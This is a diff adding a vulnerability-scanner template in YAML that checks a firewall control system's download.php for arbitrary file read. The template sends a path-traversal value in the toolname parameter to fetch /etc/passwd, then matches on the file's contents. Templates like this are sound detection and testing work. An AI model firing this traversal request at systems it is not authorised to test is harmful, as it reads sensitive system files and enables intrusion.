@@ -1,0 +1,29 @@
+id: poc-yaml-zkww-next-generation-firewall-control-system-download-php-anyfile-read
+info:
+  name: Arbitrary File Read in ZKWW Next-Generation Firewall Control System
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/download.php?&class=vpn&toolname=../../../../../../../../etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+        part: body
+      - type: word
+        words:
+          - "octet-stream"
+        part: header
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
